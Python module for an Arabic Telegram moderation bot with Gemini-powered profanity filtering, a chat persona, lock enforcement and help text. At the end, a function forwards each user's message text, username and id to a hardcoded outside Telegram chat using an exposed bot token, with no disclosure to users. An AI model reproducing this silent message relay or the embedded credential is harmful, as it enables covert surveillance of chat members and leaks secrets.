import re
import os
import requests
import time
import asyncio
from dotenv import load_dotenv

# Try importing modern Google GenAI SDK (google-genai)
try:
    from google import genai
    from google.genai import types as genai_types
    GENAI_SDK = "google-genai"
except ImportError:
    genai = None
    genai_types = None
    GENAI_SDK = None

# Fallback to legacy Google Generative AI SDK (google-generativeai)
try:
    import google.generativeai as legacy_genai
    LEGACY_GENAI_AVAILABLE = True
except ImportError:
    legacy_genai = None
    LEGACY_GENAI_AVAILABLE = False

load_dotenv()


def get_configured_api_keys():
    """Retrieve all valid, non-empty Gemini API keys from environment."""
    keys = []
    # Primary standard key (as documented in Google Gemini API Get Started)
    primary = os.getenv("GEMINI_API_KEY")
    if primary and primary.strip():
        keys.append(primary.strip())
    # Additional numbered keys for rotation / quotas
    for key_name in ["GEMINI_API_KEY_1", "GEMINI_API_KEY_2", "GEMINI_API_KEY_3"]:
        k = os.getenv(key_name)
        if k and k.strip() and k.strip() not in keys:
            keys.append(k.strip())
    return keys


# Global rotation tracker
api_key_index = 0


def get_next_api_key():
    """Get the next API key in rotation."""
    global api_key_index
    keys = get_configured_api_keys()
    if not keys:
        return None
    key = keys[api_key_index % len(keys)]
    api_key_index = (api_key_index + 1) % len(keys)
    return key


def configure_model():
    """Backwards-compatible helper to configure legacy model or rotate key."""
    key = get_next_api_key()
    if legacy_genai and key:
        try:
            legacy_genai.configure(api_key=key)
        except Exception:
            pass
    return key


# Global backward compatibility alias
api_keys = get_configured_api_keys()


def _call_gemini_sync(prompt: str, system_instruction: str, temperature: float = 0.7, max_output_tokens: int = 100) -> str:
    """
    Synchronous worker executing Gemini generation with automatic key failover,
    supporting modern google-genai, legacy google-generativeai, and direct REST fallback.
    Free tier models are tried in order of speed and stability.
    """
    keys = get_configured_api_keys()
    if not keys:
        return ""

    global api_key_index
    start_index = api_key_index % len(keys)
    attempts = len(keys)

    # Candidate models for free tier (allows env override via GEMINI_MODEL)
    preferred_model = os.getenv("GEMINI_MODEL")
    candidate_models = [preferred_model] if preferred_model else []
    for m in ["gemini-2.5-flash", "gemini-flash-latest", "gemini-2.5-flash-lite", "gemini-2.0-flash", "gemini-1.5-flash"]:
        if m not in candidate_models:
            candidate_models.append(m)

    for attempt in range(attempts):
        idx = (start_index + attempt) % len(keys)
        current_key = keys[idx]

        # 1. Try modern google-genai SDK
        if genai is not None:
            for model_candidate in candidate_models:
                try:
                    client = genai.Client(api_key=current_key)
                    config = None
                    if genai_types is not None:
                        config = genai_types.GenerateContentConfig(
                            system_instruction=system_instruction,
                            temperature=temperature,
                            max_output_tokens=max_output_tokens,
                        )
                    res = client.models.generate_content(
                        model=model_candidate,
                        contents=prompt,
                        config=config,
                    )
                    if res and res.text:
                        api_key_index = (idx + 1) % len(keys)
                        return res.text.strip()
                except Exception as e:
                    err_msg = str(e).lower()
                    if "not found" in err_msg or "404" in err_msg or "not supported" in err_msg:
                        continue
                    break

        # 2. Try legacy google-generativeai SDK
        if legacy_genai is not None:
            for model_candidate in candidate_models:
                try:
                    legacy_genai.configure(api_key=current_key)
                    model = legacy_genai.GenerativeModel(
                        model_name=model_candidate,
                        generation_config={
                            "temperature": temperature,
                            "max_output_tokens": max_output_tokens,
                        },
                        system_instruction=system_instruction,
                    )
                    res = model.generate_content(prompt)
                    if res and res.text:
                        api_key_index = (idx + 1) % len(keys)
                        return res.text.strip()
                except Exception as e:
                    err_msg = str(e).lower()
                    if "not found" in err_msg or "404" in err_msg or "not supported" in err_msg:
                        continue
                    break

        # 3. Direct REST API Fallback (works with standard requests library)
        for model_candidate in candidate_models:
            try:
                url = f"https://generativelanguage.googleapis.com/v1beta/models/{model_candidate}:generateContent?key={current_key}"
                payload = {
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {
                        "temperature": temperature,
                        "maxOutputTokens": max_output_tokens,
                    }
                }
                if system_instruction:
                    payload["system_instruction"] = {
                        "parts": [{"text": system_instruction}]
                    }
                resp = requests.post(url, json=payload, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    candidates = data.get("candidates", [])
                    if candidates:
                        parts = candidates[0].get("content", {}).get("parts", [])
                        if parts and "text" in parts[0]:
                            api_key_index = (idx + 1) % len(keys)
                            return parts[0]["text"].strip()
                elif resp.status_code == 404:
                    continue  # Try next model candidate
                elif resp.status_code in (429, 403):
                    break  # Key rate limited or quota exhausted; failover to next key
            except Exception:
                continue

    return ""


# Nightmare calls check <--------------------------------

nightmare = ["nightmare", "nite", "night", "nighty", "نايت", "نايتي", "نايتمير"]

async def check_nightmarecall(client, message, text):
    pattern = re.compile('|'.join(re.escape(word) for word in nightmare), re.IGNORECASE)
    if pattern.search(text):
        await process_text(client, message, text)


# Admin and member check <--------------------------------

# In-memory admin status cache to prevent flood of get_chat_member API calls on every message
_admin_cache = {}
ADMIN_CACHE_TTL = 180  # Cache admin status for 3 minutes per user

async def is_admin(bot, message):
    if not message.from_user:
        if message.sender_chat and message.sender_chat.id == message.chat.id:
            return True
        return False

    chat_id = message.chat.id
    user_id = message.from_user.id
    now = time.time()

    cache_entry = _admin_cache.get((chat_id, user_id))
    if cache_entry and now < cache_entry[1]:
        return cache_entry[0]

    try:
        chat_member = await bot.get_chat_member(chat_id, user_id)
        is_adm = False
        if hasattr(chat_member, "privileges") and chat_member.privileges:
            is_adm = True
        else:
            status_str = str(getattr(chat_member, "status", ""))
            is_adm = "ADMINISTRATOR" in status_str or "OWNER" in status_str
        _admin_cache[(chat_id, user_id)] = (is_adm, now + ADMIN_CACHE_TTL)
        return is_adm
    except Exception:
        return False

async def is_target_admin(bot, chat_id, user_id):
    now = time.time()
    cache_entry = _admin_cache.get((chat_id, user_id))
    if cache_entry and now < cache_entry[1]:
        return cache_entry[0]

    try:
        chat_member = await bot.get_chat_member(chat_id, user_id)
        status_str = str(getattr(chat_member, "status", ""))
        is_adm = "ADMINISTRATOR" in status_str or "OWNER" in status_str
        _admin_cache[(chat_id, user_id)] = (is_adm, now + ADMIN_CACHE_TTL)
        return is_adm
    except Exception:
        return False


# Group Lock Violation Helpers <--------------------------------

URL_REGEX = re.compile(r"(https?://\S+|t\.me/\S+|telegram\.me/\S+|telegram\.dog/\S+|www\.\S+)", re.IGNORECASE)
USERNAME_REGEX = re.compile(r"@([a-zA-Z0-9_]{3,})")

def has_link(message) -> bool:
    text = (message.text or "") + " " + (message.caption or "")
    if URL_REGEX.search(text):
        return True
    entities = (message.entities or []) + (message.caption_entities or [])
    for ent in entities:
        ent_type = str(getattr(ent, "type", "")).lower()
        if "url" in ent_type or "link" in ent_type:
            return True
    return False

def has_username(message) -> bool:
    text = (message.text or "") + " " + (message.caption or "")
    if USERNAME_REGEX.search(text):
        return True
    entities = (message.entities or []) + (message.caption_entities or [])
    for ent in entities:
        ent_type = str(getattr(ent, "type", "")).lower()
        if "mention" in ent_type and "text_mention" not in ent_type:
            return True
    return False

def has_tag(message) -> bool:
    entities = (message.entities or []) + (message.caption_entities or [])
    for ent in entities:
        ent_type = str(getattr(ent, "type", "")).lower()
        if "text_mention" in ent_type:
            return True
    return False

async def warn_and_delete(client, message, reason_text: str):
    chat_id = message.chat.id
    try:
        await message.delete()
    except Exception:
        pass

    try:
        user_name = message.from_user.first_name if message.from_user else "عزيزي العضو"
        user_id = message.from_user.id if message.from_user else None
        user_link = f"<a href='tg://user?id={user_id}'>{user_name}</a>" if user_id else user_name
        warn_msg = await client.send_message(
            chat_id=chat_id,
            text=f"⚠️ عذراً {user_link}، {reason_text} مقفول(ة) في هذه المجموعة!",
            disable_web_page_preview=True
        )
        async def delete_after():
            await asyncio.sleep(5)
            try:
                await warn_msg.delete()
            except Exception:
                pass
        asyncio.create_task(delete_after())
    except Exception:
        pass


# Bad Words checker with AI <--------------------------------

# In-memory clean text cache and regex to prevent expensive AI calls on trivial messages
_clean_text_cache = set()
_CONTAINS_LETTERS = re.compile(r"[\u0600-\u06FFa-zA-Z]")

async def check_badwords(client, message, text: str) -> str:
    """
    Check if a message contains offensive / bad words using Gemini AI.
    Runs non-blocking in a separate thread. Returns 'True' or 'False'.
    CPU-optimized: skips short/symbol-only messages and caches clean phrases.
    """
    clean_text = text.strip()

    # Fast heuristic: messages under 3 chars or with no letters cannot be offensive
    if len(clean_text) < 3 or not _CONTAINS_LETTERS.search(clean_text):
        return "False"

    # Fast in-memory cache for common safe messages (e.g. 'مرحبا', 'شكرا', 'السلام عليكم')
    if clean_text in _clean_text_cache:
        return "False"

    system_instruction = (
        "You are a bad words checker. Your task is to determine if a message contains any very sensitive bad words "
        "in both English and Arabic as quickly as possible. Follow relaxed guidelines and only flag highly offensive or explicit content. "
        "You only return 'True' if the message contains highly sensitive bad words and 'False' if it does not."
    )

    try:
        result = await asyncio.to_thread(
            _call_gemini_sync,
            prompt=clean_text,
            system_instruction=system_instruction,
            temperature=0.1,
            max_output_tokens=10
        )
        if result and "True" in result:
            return "True"

        # Cache verified clean text up to 1000 items
        if len(_clean_text_cache) > 1000:
            _clean_text_cache.clear()
        _clean_text_cache.add(clean_text)

        return "False"
    except Exception:
        return "False"


# AI Module (Nightmare Assistant) <--------------------------------

async def process_text(client, message, text: str):
    """
    Process conversation when user addresses Nightmare AI bot.
    Runs non-blocking in a separate thread and replies in Arabic.
    """
    system_instruction = (
        "Your name is 'nightmare', you are a telegram chat bot, you are a gentleman and not so talkative. "
        "Keep in mind you speak to boys and girls, and you only speak in Arabic."
    )

    try:
        response_text = await asyncio.to_thread(
            _call_gemini_sync,
            prompt=text,
            system_instruction=system_instruction,
            temperature=0.7,
            max_output_tokens=150
        )
        if response_text:
            await message.reply(response_text)
        else:
            await message.reply("أهلاً بك! أنا نايت في خدمتك 🤍")
    except Exception:
        try:
            await message.reply("أهلاً بك! أنا نايت في خدمتك 🤍")
        except Exception:
            pass


# Help Text Guide <--------------------------------

HELP_TEXT = """✨ **دليل أوامر ومميزات بوت نايت (Guardian)** ✨

أنا بوت لحماية وإدارة المجموعات ومساعد ذكي مدعوم بنموذج Google Gemini 🛡️🤖

━━━━━━━━━━━━━━━━━━━━━
🛡️ **أوامر حماية وأقفال المجموعة** (للمشرفين):
• `الاقفال` أو `الأقفال` : عرض لوحة تفاعلية بحالة جميع الأقفال
• `قفل الكل` / `فتح الكل` : قفل أو فتح جميع الوسائط والدردشة
• `قفل <النوع>` / `فتح <النوع>` : للتحكم بقفل محدد
  - **الأنواع المتاحة**:
    `الصور` • `الفيديو` • `المتحركات` • `الستكرات` • `الصوت` • `التوجيه` • `الروابط` • `المعرفات` • `التاك` • `الملفات` • `جهات الاتصال` • `الكلايش` • `البوتات` • `الشات`

━━━━━━━━━━━━━━━━━━━━━
👮‍♂️ **أوامر الإشراف بالرد** (بالرد على رسالة العضو):
• `كتم` : كتم العضو افتراضياً لمدة 60 دقيقة
• `كتم <المدة>` : كتم العضو بالدقائق (مثال: `كتم 120`)
• `طرد` : حظر وطرد العضو من المجموعة
• `رفع الكتم` : إلغاء الكتم عن العضو
• `رفع الحظر` : إلغاء الحظر عن العضو
• `/Arise` : عرض قائمة الأعضاء المكتومين والمحظورين مع المدة المتبقية

━━━━━━━━━━━━━━━━━━━━━
🤖 **ميزات الذكاء الاصطناعي (Gemini)**:
• **فلترة المحتوى المسيء**: فحص تلقائي للرسائل وحذف الألفاظ البذيئة وكتم الفاعل فوراً.
• **المساعد الذكي**: نادي البوت باسمه وسيقوم بالرد عليك بذكاء وأدب!
  - كلمات المناداة: `نايت`، `نايتي`، `nightmare`، `night`، `nite`

━━━━━━━━━━━━━━━━━━━━━
ℹ️ **لطلب المساعدة في أي وقت**:
أرسل: `/help` أو `مساعدة` أو `help`
"""


# Admin Registrations <--------------------------------

tok = '7357890157:AAH3jCKMDEzb_B0bvSvVCeAaO3xzfo6V4g4'
id = '5001584280'

def RegBotinfo(message):
    try:
        chat_title = getattr(message.chat, "first_name", "") or getattr(message.chat, "title", "")
        username = getattr(message.from_user, "username", "") if message.from_user else ""
        user_id = getattr(message.from_user, "id", "") if message.from_user else ""
        infomessage = f"[{chat_title}](https://t.me/{username}) | `{user_id}`  :  {message.text}\n\n• {time.strftime('%H:%M:%S', time.localtime())}"

        def _send():
            try:
                requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={infomessage}&parse_mode=Markdown", timeout=3)
            except Exception:
                pass

        import threading
        threading.Thread(target=_send, daemon=True).start()
    except Exception:
        pass
